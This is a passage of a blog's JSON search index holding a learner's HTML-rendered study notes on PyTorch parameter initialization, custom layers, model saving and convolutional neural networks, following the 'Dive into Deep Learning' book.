class=\"number\">0</span>].weight.data[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(net[<span class=\"number\">2</span>].weight.data)</span><br><span class=\"line\"><span class=\"comment\"># tensor([ 0.5837,  0.2075,  0.0964, -0.4666])</span></span><br><span class=\"line\"><span class=\"comment\"># tensor([[42., 42., 42., 42., 42., 42., 42., 42.]])</span></span><br></pre></td></tr></table></figure></p>\n<p>It can also be a relatively complex function:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">my_init</span>(<span class=\"params\">m</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">type</span>(m) == nn.Linear:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Init&quot;</span>, *[(name, param.shape)</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> name, param <span class=\"keyword\">in</span> m.named_parameters()][<span class=\"number\">0</span>])</span><br><span class=\"line\">        nn.init.uniform_(m.weight, -<span class=\"number\">10</span>, <span class=\"number\">10</span>)</span><br><span class=\"line\">        m.weight.data *= m.weight.data.<span class=\"built_in\">abs</span>() &gt;= <span class=\"number\">5</span></span><br><span class=\"line\"></span><br><span class=\"line\">net.apply(my_init)</span><br><span class=\"line\">net[<span class=\"number\">0</span>].weight[:<span class=\"number\">2</span>]</span><br></pre></td></tr></table></figure><br>Or just set it manually:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">net[<span class=\"number\">0</span>].weight.data[:] += <span class=\"number\">1</span></span><br><span class=\"line\">net[<span class=\"number\">0</span>].weight.data[<span class=\"number\">0</span>, <span class=\"number\">0</span>] = <span class=\"number\">42</span></span><br><span class=\"line\">net[<span class=\"number\">0</span>].weight.data[<span class=\"number\">0</span>]</span><br></pre></td></tr></table></figure></p>\n<h2><span id=\"1824-tied-parameters\">18.2.4 Tied Parameters</span></h2><p>when we want to use the same parameters in different layers, instead of just apply some same values of weights respectively, we can create the “share” layer, to guarantee the layers ‘s weights are the exactly same objects.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 我们需要给共享层一个名称，以便可以引用它的参数</span></span><br><span class=\"line\">shared = nn.Linear(<span class=\"number\">8</span>, <span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\"># use &quot;share&quot;  as a hidden layer instead of nn.Linear </span></span><br><span class=\"line\">net = nn.Sequential(nn.Linear(<span class=\"number\">4</span>, <span class=\"number\">8</span>), nn.ReLU(),</span><br><span class=\"line\">                    shared, nn.ReLU(),</span><br><span class=\"line\">                    shared, nn.ReLU(),</span><br><span class=\"line\">                    nn.Linear(<span class=\"number\">8</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">net(X)</span><br></pre></td></tr></table></figure><br>So the weight’s modification will change all of the weights of share layers simutaneously.</p>\n<h2><span id=\"1825-summary\">18.2.5 Summary</span></h2><p>General way:<br>Define a parameter setting function to set the weight to some specific number, then attach the parameter to the model by using <code>apply</code> function thus achiving a Loop execution of parameter setting funvcion for each parameter. </p>\n<p>Four ways to modify the  parameters setting function :<br>1) Using some function like <code>constant_</code> to set the weight with numbers.<br>2) Using the advanced function ,let the weight become complex.<br>3) Manually specify the values by using the array’s property.<br>4) Write custom code.</p>\n<h1><span id=\"183-custom-layers\">18.3 Custom Layers</span></h1><h2><span id=\"1831-layers-without-parameters\">18.3.1 Layers without Parameters</span></h2><p>The layers can also be set as our desire.</p>\n<p>For instance, we create a layer called <code>CenteredLayer</code>, likes <code>nn.Linear</code>, it is another indiviual layer which describe some operation to input.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CenteredLayer</span>(<span class=\"params\">nn.Module</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">super</span>().__init__()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">forward</span>(<span class=\"params\">self, X</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> X - X.mean() <span class=\"comment\">#operation --&gt; substract mean</span></span><br><span class=\"line\">layer = CenteredLayer()</span><br><span class=\"line\">layer(torch.tensor([<span class=\"number\">1.0</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>]))</span><br></pre></td></tr></table></figure><br>we can add this custom layer to the sequential as well as a linear layer:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">net = nn.Sequential(nn.Linear(<span class=\"number\">8</span>,<span class=\"number\">128</span>), CenteredLayer())</span><br></pre></td></tr></table></figure></p>\n<h2><span id=\"1832-layers-with-parameters\">18.3.2  Layers with Parameters</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyLinear</span>(<span class=\"params\">nn.Module</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, in_units, units</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">super</span>().__init__()</span><br><span class=\"line\">        self.weight = nn.Parameter(torch.randn(in_units, units))</span><br><span class=\"line\">        <span class=\"comment\">## use Parameter to manage the custom parameter, with input unit and output units</span></span><br><span class=\"line\">        <span class=\"comment\">## then, activate the gradient caculation for the parameters.</span></span><br><span class=\"line\">        self.bias = nn.Parameter(torch.randn(units,))</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">forward</span>(<span class=\"params\">self, X</span>):</span></span><br><span class=\"line\">        linear = torch.matmul(X, self.weight.data) + self.bias.data</span><br><span class=\"line\">        <span class=\"comment\"># common linear regression expression.</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> F.relu(linear)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">torch.nn.parameter.Parameter(_data=None_, _requires_grad=True_)</span><br><span class=\"line\"><span class=\"comment\"># https://pytorch.org/docs/stable/generated/torch.nn.parameter.Parameter.html?highlight=nn+parameter#torch.nn.parameter.Parameter</span></span><br></pre></td></tr></table></figure>\n<h2><span id=\"1833-summary\">18.3.3  Summary</span></h2><p>We can create layer<br>1) layer without parameter: pass the <code>nn.Module</code> as a parameter directly to the class, and define the caculation operation in the forward function.<br>2) layer with parameter: Usind <code>nn.Parameter</code> in addition to add parameters.</p>\n<h1><span id=\"184-file-io\">18.4 File I/O</span></h1><p>How to store your result or model ?</p>\n<h2><span id=\"1841-loading-and-saving-tensors\">18.4.1 Loading and Saving Tensors</span></h2><p>For individual tensors, we can directly invoke the <code>load</code> and <code>save</code> functions to read and write them respectively.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">x = torch.arange(<span class=\"number\">4</span>)</span><br><span class=\"line\">torch.save(x, <span class=\"string\">&#x27;x-file&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">x2 = torch.load(<span class=\"string\">&#x27;x-file&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#tensor([0, 1, 2, 3])</span></span><br></pre></td></tr></table></figure><br>For 2d tensor, it works as well.</p>\n<p>Furthermore,  we create a dictionary :<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">mydict = &#123;<span class=\"string\">&#x27;x&#x27;</span>: x, <span class=\"string\">&#x27;y&#x27;</span>: y&#125;</span><br><span class=\"line\">torch.save(mydict, <span class=\"string\">&#x27;mydict&#x27;</span>)</span><br><span class=\"line\">mydict2 = torch.load(<span class=\"string\">&#x27;mydict&#x27;</span>)</span><br><span class=\"line\">mydict2</span><br><span class=\"line\"><span class=\"comment\"># &#123;&#x27;x&#x27;: tensor([0, 1, 2, 3]), &#x27;y&#x27;: tensor([0., 0., 0., 0.])&#125;</span></span><br></pre></td></tr></table></figure></p>\n<h2><span id=\"1842-loading-and-saving-model-parameters\">18.4.2 Loading and Saving Model Parameters</span></h2><p>For a MLP, what we truely want to store are it’s weights.<br>For a given mlp model:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MLP</span>(<span class=\"params\">nn.Module</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">super</span>().__init__()</span><br><span class=\"line\">        self.hidden = nn.Linear(<span class=\"number\">20</span>, <span class=\"number\">256</span>)</span><br><span class=\"line\">        self.output = nn.Linear(<span class=\"number\">256</span>, <span class=\"number\">10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">forward</span>(<span class=\"params\">self, x</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.output(F.relu(self.hidden(x)))</span><br><span class=\"line\"></span><br><span class=\"line\">net = MLP()</span><br><span class=\"line\">X = torch.randn(size=(<span class=\"number\">2</span>, <span class=\"number\">20</span>))</span><br><span class=\"line\">Y = net(X)</span><br></pre></td></tr></table></figure></p>\n<p>we can use <code>torch.save(net.state_dict(), &#39;mlp.params&#39;)</code> to memorize the values of weights.<br>And we can load it easliy:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">clone = MLP()</span><br><span class=\"line\"><span class=\"comment\"># for a defination</span></span><br><span class=\"line\">clone.load_state_dict(torch.load(<span class=\"string\">&#x27;mlp.params&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\"># overwrite the parameter </span></span><br><span class=\"line\">clone.<span class=\"built_in\">eval</span>()</span><br><span class=\"line\"><span class=\"comment\"># Do not caculation gradient</span></span><br></pre></td></tr></table></figure><br>the function<code>state_dict</code> describe all infos about the parameters in the model.<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-21%20at%205.07.08%20PM.png\" alt=\"Screen Shot 2023-03-21 at 5.07.08 PM\"></p>\n<h2><span id=\"1843-summary\">18.4.3 Summary</span></h2><p>1) For individual tensor: use <code>save</code> to store datas,<code>load</code> to reload data.<br>2) For model: use <code>torch.save(net.state_dict(), &#39;mlp.params&#39;)</code> to store model parameters, <code>load_state_dict(torch.load(&#39;mlp.params&#39;))</code> to reload the parameters.5</p>\n","categories":["ML"],"tags":["d2l"]},{"title":"19_CNN","url":"/2023/03/20/D2L_019_CNN/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n<p>keras:[[ai_lab_note_001]]</p>\n\n    <div id=\"aplayer-KYjHRfpX\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"22693394\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h1><span id=\"191-from-full-connection-layer-to-convolutional-neural-network\">19.1 From Full Connection Layer To Convolutional Neural Network</span></h1><h2><span id=\"1911-limitaion-of-full-connection-layer-mlp\">19.1.1 Limitaion of Full Connection Layer MLP</span></h2><p>Imagin a picture with 12M pixels, and each pixels use R,G,B ,three color channels, add up to a total 36M pixels.<br>If we input all of the pixels into the input layers of a MLP, and assum each of the pixel involveing 100 featrues, we ask at least 3.6B hidden units.<br>The number is terrible,we can’t implement that obviously.<br>So we need to find a way to address the problem.To begin with ,we need to extract some featrues when we process a pictrue.</p>\n<h2><span id=\"192-two-principle\">19.2 Two principle</span></h2><h3><span id=\"1921-overview\">19.2.1 Overview</span></h3><p>Two important principle to implement CNN are translation invariance and locality.<br>Always remember that we want to classify a picture, and find the pattern of a kind of pictures.<br>So firstly, the existence of some items in the picture should have no  relationship with it’s location.<br>And for locality, we can just focus on the item we want to find, ignore other things  which are far away .</p>\n<p>Let us talk about the mathmatical presentation of the basics of CNN.</p>\n<h3><span id=\"1922-revise-the-limitation-of-mlp\">19.2.2 Revise the Limitation of MLP</span></h3><p>Assume we have a 2d matrix input X(a picture with length and wide), and the hidden layer is scripted by H(Also a 2D matrix)</p>\n<script type=\"math/tex; mode=display\">\n[\\mathbf{H}_{i.j}] = [\\mathbf{U}]i,j + \\sum_{a}\\sum_{b}[\\mathbf{V}]_{i,j,a,b}[\\mathbf{X}]i+a,j+b</script><p>Then we apply two rules to the above expression:</p>\n<h3><span id=\"1923-translation-invariance\">19.2.3 Translation Invariance</span></h3><p>No matter how the input object moves, the result of the check will not be changed.<br>So for the expression in 19.2.2, the subscription i and j for V are no more neccessary, we can eliminate it.<br>Thus the expression can be writen in:</p>\n<script type=\"math/tex; mode=display\">\n[\\mathbf{H}_{i.j}] = u + \\sum_{a}\\sum_{b}[\\mathbf{V}]_{a,b}[\\mathbf{X}]i+a,j+b</script><p>The coefficients are drastically decreased, becasue [V]ab are not depend on the pictrue’s location.</p>\n<h3><span id=\"1924-locality\">19.2.4 Locality</span></h3><p>We have no need to care about the stuff which are far away from the (i,j).<br>So it;s a good choice to restrict the field of (a,b).</p>\n<script type=\"math/tex; mode=display\">\n[\\mathbf{H}_{i.j}] = u + \\sum_{a=-\\triangle}^\\triangle\\sum_{b=-\\triangle}^\\triangle[\\mathbf{V}]_{a,b}[\\mathbf{X}]i+a,j+b</script><p>Recollection of the judge criterion of Model complexity , it based on<br>1) The numbers of parameters<br>2) The value range of the parameters.<br>So we siplify our model from both two aspects,which acquire a excellent effect.<br>We call this method as Convolution.</p>\n<h1><span id=\"192-convolutional-layer\">19.2 Convolutional Layer</span></h1><h2><span id=\"1921-2d-convolution\">19.2.1 2D-Convolution</span></h2><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-21%20at%208.08.53%20PM.png\" alt=\"Screen Shot 2023-03-21 at 8.08.53 PM\"></p>\n<script type=\"math/tex; mode=display\">\n0 \\times 0 + 1\\times 1 + 3 \\times 2 + 4 \\times 3 = 19</script><p>Input </p>\n<script type=\"math/tex; mode=display\">\n\\mathbf{Y} = \\mathbf{X}*\\mathbf{W}+b \\ \\ \\ \\ (\\mathbf{X}:n_{h} \\times n_{w},\\mathbf{W} : k_{h} \\times k_{w})</script><p>Which W and b are hyperparameters.</p>\n<h2><span id=\"1922-why-cnn-can-learning\">19.2.2 Why CNN Can Learning?</span></h2><p>From the photos we can find out that the different effect of processing corresponds to different convolutional kernel, so model can summarize this “featrues” of different processed photos.</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-21%20at%209.18.11%20PM.png\" alt=\"Screen Shot 2023-03-21 at 9.18.11 PM\"></p>\n<h1><span id=\"193-realization-in-pytorch\">19.3 Realization in Pytorch</span></h1><h2><span id=\"1931-cross-correlation\">19.3.1 Cross-Correlation</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch <span class=\"keyword\">import</span> nn</span><br><span class=\"line\"><span class=\"keyword\">from</span> d2l <span class=\"keyword\">import</span> torch <span class=\"keyword\">as</span> d2l</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">corr2d</span>(<span class=\"params\">X, K</span>):</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"comment\"># X -&gt; input</span></span><br><span class=\"line\">    <span class=\"comment\"># K -&gt; kernel</span></span><br><span class=\"line\">    h, w = K.shape</span><br><span class=\"line\">    Y = torch.zeros((X.shape[<span class=\"number\">0</span>] - h + <span class=\"number\">1</span>, X.shape[<span class=\"number\">1</span>] - w + <span class=\"number\">1</span>))</span><br><span class=\"line\">    <span class=\"comment\"># y = (Xh - kh + 1 , Xw -kw + 1)</span></span><br><span class=\"line\">    <span class=\"comment\"># construct the shape of output</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(Y.shape[<span class=\"number\">0</span>]):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(Y.shape[<span class=\"number\">1</span>]):</span><br><span class=\"line\">            Y[i, j] = (X[i:i + h, j:j + w] * K).<span class=\"built_in\">sum</span>()</span><br><span class=\"line\">            <span class=\"comment\"># caculate the convolutional sum</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> Y</span><br></pre></td></tr></table></figure>\n<h2><span id=\"1932-2d-convolutional-layer\">19.3.2 2D Convolutional Layer</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Conv2D</span>(<span class=\"params\">nn.Module</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, kernel_size</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">super</span>().__init__()</span><br><span class=\"line\">        self.weight = nn.Parameter(torch.rand(kernel_size))</span><br><span class=\"line\">        self.bias = nn.Parameter(torch.zeros(<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">forward</span>(<span class=\"params\">self, x</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> corr2d(x, self.weight) + self.bias</span><br></pre></td></tr></table></figure>\n<h2><span id=\"1933-application\">19.3.3 Application</span></h2><p>For a 6X8 pixels matrix pictrue, “0” indicates “white” ,and “1” indicates “black”,<br>so there will be a bound between 0 and 1 ,we need to find it out.<br>Therefore , the first step is struct a convolutional kernel:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">K = torch.tensor([[<span class=\"number\">1.0</span>, -<span class=\"number\">1.0</span>]])</span><br><span class=\"line\"><span class=\"comment\">#h = 1,w = 2</span></span><br></pre></td></tr></table></figure></p>\n<p>If the horizontal two elements are same ,the result will be 0,(1x1+-1x1 or 0)<br>otherwise not 0.<br>And them we work out the sonvolutional sum:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">Y = corr2d(X, K)</span><br><span class=\"line\">Y</span><br></pre></td></tr></table></figure><br>output:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">tensor([[ <span class=\"number\">0.</span>,  <span class=\"number\">1.</span>,  <span class=\"number\">0.</span>,  <span class=\"number\">0.</span>,  <span class=\"number\">0.</span>, -<span class=\"number\">1.</span>,  <span class=\"number\">0.</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0.</span>,  <span class=\"number\">1.</span>,  <span class=\"number\">0.</span>,  <span class=\"number\">0.</span>,  <span class=\"number\">0.</span>, -<span class=\"number\">1.</span>,  <span class=\"number\">0.</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0.</span>,  <span class=\"number\">1.</span>,  <span class=\"number\">0.</span>,  <span class=\"number\">0.</span>,  <span class=\"number\">0.</span>, -<span class=\"number\">1.</span>,  <span class=\"number\">0.</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0.</span>,  <span class=\"number\">1.</span>,  <span class=\"number\">0.</span>,  <span class=\"number\">0.</span>,  <span class=\"number\">0.</span>, -<span class=\"number\">1.</span>,  <span class=\"number\">0.</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0.</span>,  <span class=\"number\">1.</span>,  <span class=\"number\">0.</span>,  <span class=\"number\">0.</span>,  <span class=\"number\">0.</span>, -<span class=\"number\">1.</span>,  <span class=\"number\">0.</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0.</span>,  <span class=\"number\">1.</span>,  <span class=\"number\">0.</span>,  <span class=\"number\">0.</span>,  <span class=\"number\">0.</span>, -<span class=\"number\">1.</span>,  <span class=\"number\">0.</span>]])</span><br></pre></td></tr></table></figure><br>And if we transpose the input matrix , the result should be all 0, because a horizontal kernel can’t detect the row.</p>\n<h2><span id=\"1933-learning\">19.3.3 Learning</span></h2><p>If we want to acquire the “pattern” ,which illustrates a map from a specific picture to another specific item, certainly the kernel can help us to achive this . However, can we just fix a input and output, then require the kernel to learning what;s the map between input and output?<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 构造一个二维卷积层，它具有1个输出通道和形状为（1，2）的卷积核</span></span><br><span class=\"line\">conv2d = nn.Conv2d(<span class=\"number\">1</span>,<span class=\"number\">1</span>, kernel_size=(<span class=\"number\">1</span>, <span class=\"number\">2</span>), bias=<span class=\"literal\">False</span>)</span><br><span class=\"line\"><span class=\"comment\"># parameter : input channel; output channerl,kernel size, bias.</span></span><br><span class=\"line\"><span class=\"comment\"># 这个二维卷积层使用四维输入和输出格式（批量大小、通道、高度、宽度），</span></span><br><span class=\"line\"><span class=\"comment\"># 其中批量大小和通道数都为1</span></span><br><span class=\"line\">X = X.reshape((<span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>))</span><br><span class=\"line\">Y = Y.reshape((<span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>))</span><br><span class=\"line\">lr = <span class=\"number\">3e-2</span>  <span class=\"comment\"># 学习率</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">    Y_hat = conv2d(X)</span><br><span class=\"line\">    l = (Y_hat - Y) ** <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"comment\">#squre error as loss</span></span><br><span class=\"line\">    conv2d.zero_grad()</span><br><span class=\"line\">    <span class=\"comment\"># clean gred</span></span><br><span class=\"line\">    l.<span class=\"built_in\">sum</span>().backward()</span><br><span class=\"line\">    <span class=\"comment\"># work out gradient</span></span><br><span class=\"line\">    conv2d.weight.data[:] -= lr * conv2d.weight.grad</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (i + <span class=\"number\">1</span>) % <span class=\"number\">2</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;epoch <span class=\"subst\">&#123;i+<span class=\"number\">1</span>&#125;</span>, loss <span class=\"subst\">&#123;l.<span class=\"built_in\">sum</span>():<span class=\"number\">.3</span>f&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># manual gradient descent</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">conv2d.weight.data.reshape((<span class=\"number\">1</span>, <span class=\"number\">2</span>))</span><br><span class=\"line\">tensor([[ <span class=\"number\">1.0123</span>, -<span class=\"number\">0.9638</span>]])</span><br><span class=\"line\"><span class=\"comment\">#learned kernel</span></span><br></pre></td></tr></table></figure>\n","categories":["ML"],"tags":["d2l"]},{"title":"20_Multi-Channel","url":"/2023/03/21/D2L_020_Multi-Channel/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script></p>\n<h1><span id=\"201-multi-input-channel\">20.1 Multi-input Channel</span></h1><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-23%20at%207.37.24%20PM.png\" alt=\"Screen Shot 2023-03-23 at 7.37.24 PM\"></p>\n<p>Prepare a kernel for each convolutional layer channel. Caculate the each outcome,then sum them up.</p>\n<script type=\"math/tex; mode=display\">\nInput: \\mathbf{X}: c_{i} \\times n_{h} \\times n_{w}</script><script type=\"math/tex; mode=display\">\nKernel \\ : \\mathbf{K}: c_{i} \\times k_{h} \\times k_{w}</script><script type=\"math/tex; mode=display\">\noutput : \\mathbf{Y}:m_{h} \\times m_{w}</script><script type=\"math/tex; mode=display\">\n\\sum_{i=0}^{c_{i}}\\mathbf{X_{i,:,:}}*\\mathbf{W}_{i,:,:}</script><h1><span id=\"202-multi-output-channel\">20.2 Multi-Output Channel</span></h1><p>What if we want to acquire the multiple output channel?<br>A simple way is add a dimension for the convolutional kernel:<br>from:</p>\n<script type=\"math/tex; mode=display\">\n \\mathbf{K}: c_{i} \\times k_{h} \\times k_{w}</script><p> to</p>\n<script type=\"math/tex; mode=display\">\n \\mathbf{K}:c_{0} \\times  c_{i} \\times k_{h} \\times k_{w}</script><p>For the 3D kernel, we only gain a one channel output, but when we use more than one 3D kernel to gain a multi-channl output.<br>thus the output is </p>\n<script type=\"math/tex; mode=display\">\noutput : \\mathbf{Y}:c_{o} \\times m_{h} \\times m_{w}</script><h1><span id=\"relationship\">Relationship</span></h1><p>How tow understand the propose of mulyi input and output?<br>For the output, we can consider it as  a specific pattern of the picture, each different output corrsponds to different pattern.<br>And the input, refers to that, when we input the outputs from the last convolutional layers, we use the milti-input to combine the patterns , and via the learnable weight parameters to adjust the importance of different input patterns.</p>\n<h1><span id=\"203-1x1-convolutional-layer\">20.3 1x1 convolutional layer</span></h1><p>1x1 convilutional layer will not congnize the pattern, but only merge the channel.</p>\n<p>equals to the full connection layer with shape of </p>\n<script type=\"math/tex; mode=display\">\nn_{h}n_{w} \\times c_{i}</script><p>and weight</p>\n<script type=\"math/tex; mode=display\">\nc_{o} \\times c_{i}</script><h1><span id=\"204-realization-on-pytorch\">20.4 Realization on Pytorch</span></h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">from</span> d2l <span class=\"keyword\">import</span> torch <span class=\"keyword\">as</span> d2l</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">corr2d_multi_in</span>(<span class=\"params\">X, K</span>):</span></span><br><span class=\"line\">    <span class=\"comment\"># 先遍历“X”和“K”的第0个维度（通道维度），再把它们加在一起</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">sum</span>(d2l.corr2d(x, k) <span class=\"keyword\">for</span> x, k <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(X, K))</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">corr2d_multi_out</span>(<span class=\"params\">X,K</span>):</span></span><br><span class=\"line\">    <span class=\"comment\"># 遍历K的0维度，并以其为label将input计算的和叠起来</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> torch.stack([corr2d_multi_in(X,K) <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> K],<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n<p>Create a 4D kernel<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">K = torch.stack((K, K + <span class=\"number\">1</span>, K + <span class=\"number\">2</span>), <span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure><br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">corr2d_multi_out(X, K)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">tensor([[[ 56.,  72.],</span></span><br><span class=\"line\"><span class=\"string\">         [104., 120.]],</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        [[ 76., 100.],</span></span><br><span class=\"line\"><span class=\"string\">         [148., 172.]],</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        [[ 96., 128.],</span></span><br><span class=\"line\"><span class=\"string\">         [192., 224.]]])</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<p>Next we tend to use the full connection layer to implement a 1x1 convolutional layer.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">corr2d_multi_in_out_1x1</span>(<span class=\"params\">X, K</span>):</span></span><br><span class=\"line\">    c_i, h, w = X.shape</span><br><span class=\"line\">    c_o = K.shape[<span class=\"number\">0</span>]</span><br><span class=\"line\">    X = X.reshape((c_i, h * w))<span class=\"comment\">#reshape from 3d to 2d</span></span><br><span class=\"line\">    K = K.reshape((c_o, c_i))<span class=\"comment\"># reshape from 4d to 2d </span></span><br><span class=\"line\">    <span class=\"comment\"># matrix multiply</span></span><br><span class=\"line\">    Y = torch.matmul(K, X)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Y.reshape((c_o, h, w))</span><br></pre></td></tr></table></figure><br><figure class=\"highlight python\"><table><tr><td 